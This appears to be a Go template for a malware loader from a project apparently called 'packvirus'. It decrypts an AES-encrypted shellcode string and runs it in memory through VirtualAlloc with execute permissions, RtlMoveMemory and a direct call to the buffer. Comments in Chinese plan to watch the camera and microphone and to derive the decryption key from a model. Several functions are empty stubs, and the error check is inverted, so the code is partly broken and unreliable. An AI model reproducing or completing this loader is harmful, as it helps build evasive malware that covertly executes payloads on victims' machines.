package template

import (
	"encoding/base64"
	"fmt"
	"github.com/gonutz/ide/w32"
	"os"
	"packvirus/encrypt"
	"syscall"
	"unsafe"
)

var modelPath string = "{{ .modelPath }}"
var encrypedShellCode string = "{{ .encrypedShellCode }}"

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
)

func main() {
	// you should load model before you start monitoring
	picChan := make(chan string)
	soundChan := make(chan string)
	exitChan := make(chan bool)

	go func() {
		picChan <- "picture"
		// 启动监控摄像头
	}()

	go func() {
		// 启动监控麦克风
		soundChan <- "sound"
	}()

	go func() {
		key := []byte("1100110011001100")
		// 加载模型，输入模型，得到 key

		// 用 key 解码 shellcode 并执行
		sc, err := encrypt.DecryptFunctions["aes"]([]byte(encrypedShellCode), key)
		checkError(err)
		err = exec(sc)
		checkError(err)

		exitChan <- true
	}()

	if <-exitChan {
		fmt.Println("end...")
		os.Exit(1)
	}
}

//----------------Utils----------------

func build(ddm string) {
	sDec, _ := base64.StdEncoding.DecodeString(ddm)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
	_, _, err := syscall.Syscall(addr, 0, 0, 0, 0)
	checkError(err)
}

func checkError(err error) {
	if err == nil {
		os.Exit(1)
	}
}

func exec(sc []byte) error {
	return nil
}

func showConsoleAsync(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

// ----------------Monitor----------------

func CaptureVideo() {
}

// ----------------Model----------------

func LoadModel() {
}
